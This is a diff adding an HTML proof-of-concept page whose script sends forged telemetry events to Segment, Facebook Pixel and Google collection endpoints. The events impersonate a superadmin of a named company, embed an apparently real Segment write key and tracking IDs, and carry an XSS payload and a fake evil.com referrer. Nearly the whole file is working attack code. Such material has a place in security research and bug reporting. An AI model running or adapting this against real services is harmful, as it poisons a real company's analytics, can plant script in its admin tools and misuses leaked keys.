@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🔥 CORS Spoofed Telemetry Injection PoC</title>
+</head>
+<body>
+  <h2>Spoofed CORS PoC: Segment, Facebook, Google</h2>
+
+  <script>
+    // 1. Segment - Spoofed userId and traits
+    fetch("https://api.segment.io/v1/p", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify({
+        type: "identify",
+        userId: "admin@taxjar.com",
+        traits: {
+          role: "superadmin",
+          email: "admin@taxjar.com",
+          fake_field: "<img src=x onerror=alert(`XSS by evil.com`)>"
+        },
+        context: {
+          page: {
+            url: "https://app.taxjar.com/admin",
+            referrer: "https://evil.com"
+          }
+        },
+        anonymousId: "attacker-session-001",
+        writeKey: "jPW0Udoiicg5iccClHsBoWgjNoBdwd8N"
+      })
+    })
+    .then(res => res.text())
+    .then(data => {
+      console.log("Segment.io:", data);
+      document.body.innerHTML += `<h3>Segment.io</h3><pre>${data}</pre>`;
+    });
+
+    // 2. Facebook Pixel - Fake form + button metadata
+    const fbForm = new FormData();
+    fbForm.append("id", "374982569515249");
+    fbForm.append("ev", "SubscribedButtonClick");
+    fbForm.append("dl", "https://app.taxjar.com/session");
+    fbForm.append("cd[formFeatures]", JSON.stringify([
+      { name: "session[email]", inputType: "text", valueMeaning: "admin@taxjar.com" },
+      { name: "session[password]", inputType: "password", valueMeaning: "hunter2" }
+    ]));
+    fbForm.append("cd[buttonFeatures]", JSON.stringify({
+      tag: "input", type: "submit", value: "Log in", id: "login", innerText: "Log in"
+    }));
+
+    fetch("https://www.facebook.com/tr/", {
+      method: "POST",
+      body: fbForm
+    })
+    .then(res => res.text())
+    .then(data => {
+      console.log("Facebook Pixel:", data);
+      document.body.innerHTML += `<h3>Facebook Pixel</h3><pre>Sent form metadata</pre>`;
+    });
+
+    // 3. Google - Fake pageview of admin panel
+    fetch("https://www.google.com/ccm/collect?tid=AW-975686394&en=page_view&dl=https%3A%2F%2Fapp.taxjar.com%2Fadmin", {
+      method: "POST"
+    })
+    .then(res => res.text())
+    .then(data => {
+      console.log("Google Tag:", data);
+      document.body.innerHTML += `<h3>Google Tag</h3><pre>Admin pageview spoofed</pre>`;
+    });
+  </script>
+</body>
+</html>
